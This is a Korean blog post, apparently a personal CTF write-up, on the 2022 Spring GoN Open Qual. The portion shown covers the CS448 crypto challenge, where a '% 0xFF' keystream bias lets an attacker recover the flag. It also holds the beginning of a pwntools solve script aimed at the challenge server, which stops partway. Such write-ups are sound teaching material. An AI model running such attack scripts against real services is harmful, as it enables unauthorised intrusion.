<!DOCTYPE html><html lang="ko" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="2022 Spring GoN Open Qual Writeup" /><meta name="author" content="G0RiyA" /><meta property="og:locale" content="ko" /><meta name="description" content="GoN에서 드림핵에 CTF를 열었다. 크게 할 일도 없었고, 재밌는 문제도 많아 보이는 데다가 상위 3명에겐 치킨도 준대서 꽤 열심히 참여했다." /><meta property="og:description" content="GoN에서 드림핵에 CTF를 열었다. 크게 할 일도 없었고, 재밌는 문제도 많아 보이는 데다가 상위 3명에겐 치킨도 준대서 꽤 열심히 참여했다." /><link rel="canonical" href="https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/" /><meta property="og:url" content="https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/" /><meta property="og:site_name" content="G0RiyA" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-23T15:00:00+09:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="2022 Spring GoN Open Qual Writeup" /><meta name="google-site-verification" content="3Nq9VruZBkB9oTqSkann3Hew3z9ngFzj1r0-Kb04MFM" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"G0RiyA"},"description":"GoN에서 드림핵에 CTF를 열었다. 크게 할 일도 없었고, 재밌는 문제도 많아 보이는 데다가 상위 3명에겐 치킨도 준대서 꽤 열심히 참여했다.","url":"https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/","@type":"BlogPosting","headline":"2022 Spring GoN Open Qual Writeup","dateModified":"2022-03-24T03:42:02+09:00","datePublished":"2022-03-23T15:00:00+09:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://g0riya.github.io/posts/2022-Spring-GoN-Open-Qual-Writeup/"},"@context":"https://schema.org"}</script><title>2022 Spring GoN Open Qual Writeup | G0RiyA</title><link rel="apple-touch-icon" sizes="180x180" href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAAD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="><link rel="icon" type="image/png" sizes="32x32" href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAAD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="><link rel="icon" type="image/png" sizes="16x16" href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAAD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAAD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="><meta name="apple-mobile-web-app-title" content="G0RiyA"><meta name="application-name" content="G0RiyA"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><meta name="naver-site-verification" content="6f5bce50b7160f76dbd2054dbf1e03c92f067a77" /> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">G0RiyA</a></div><div class="site-subtitle">🔥<br><a href=//guesser.team >@SuperGuesser</a></div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/G0RiyA" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['g0y4ng2','kakao.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>2022 Spring GoN Open Qual Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>2022 Spring GoN Open Qual Writeup</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/G0RiyA">G0RiyA</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-03-23 15:00:00 +0900" data-toggle="tooltip" data-placement="bottom" title="Wed, Mar 23, 2022, 3:00 PM +0900" >Mar 23</em> </span> <span> Updated <em class="timeago" date="2022-03-24 03:42:02 +0900 " data-toggle="tooltip" data-placement="bottom" title="Thu, Mar 24, 2022, 3:42 AM +0900" >Mar 24</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="9604 words"> <em>53 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="/assets/img/post-1/1.png" alt="1.png" data-proofer-ignore> GoN에서 드림핵에 CTF를 열었다.<br /> 크게 할 일도 없었고, 재밌는 문제도 많아 보이는 데다가 상위 3명에겐 치킨도 준대서 꽤 열심히 참여했다.</p><p><img data-src="/assets/img/post-1/2.png" alt="2.png" data-proofer-ignore> 대회는 2위로 마무리 했고, 재밌게 풀었던 문제들이 많아서 풀이를 해보려고 한다.</p><hr /><h2 id="a-cs448---crypto">A. CS448 - Crypto<a href="#a-cs448---crypto" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>운좋게 퍼블딴 문제이다.</p><p>대충 보면 아래와 같은 <code class="language-plaintext highlighter-rouge">encrypt</code>함수를 사용해서 플래그를 암호화해서 사용자에게 전달한다.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">k</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">if</span> <span class="n">k</span> <span class="o">&lt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
        <span class="n">_print</span><span class="p">(</span><span class="s">"[!] key shold be larger then len(pt) for safty!!"</span><span class="p">)</span>
        <span class="k">return</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
        <span class="n">enc</span> <span class="o">=</span> <span class="p">(</span><span class="n">get_random_u8</span><span class="p">()</span> <span class="o">+</span> <span class="n">key</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0xff</span>
        <span class="n">enc</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">^</span> <span class="n">enc</span>
        <span class="n">res</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">enc</span><span class="p">)[</span><span class="mi">2</span><span class="p">:].</span><span class="n">rjust</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span>
</pre></table></code></div></div><p>완전한 랜덤 값을 이용해서 xor을 하는 것 같지만 잘 보면 <code class="language-plaintext highlighter-rouge">&amp; 0xFF</code>가 아닌 <code class="language-plaintext highlighter-rouge">% 0xFF</code>를 통해서 키를 byte크기로 맞춘다.<br /> 때문에 xor하는 key의 값이 절대로 255가 될 수 없고 따라서 무한으로 요청을 날리면서 <code class="language-plaintext highlighter-rouge">(끝끝내 나오지 않는 하나의 값) ^ 255</code>를 하면 플래그의 각 바이트를 구할 수 있다.</p><p>그리고 마침 이번 해킹캠프에 냈던 문제와 컨셉이 겹쳐서 poc 코드를 조금 수정해서 풀이하였다.</p><blockquote><p>Solution Script</p></blockquote><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># p = process(['python','-u','./chall.py'])
</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"wargame.goatskin.kr"</span><span class="p">,</span> <span class="mi">42917</span><span class="p">)</span>
<span class="c1"># context.log_level= 0
</span>
<span class="n">key_set</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">255</span><span class="p">)))</span>
<span class="n">rand_set</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">)))</span>
<span class="n">my_key</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">rand_set</span> <span class="o">-</span> <span class="n">key_set</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span><span class="s">'3'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'&gt;&gt; '</span><span class="p">,</span><span class="s">'255'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">': '</span><span class="p">)</span> 
<span class="n">flag_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span><span class="o">//</span><span class="mi">2</span>

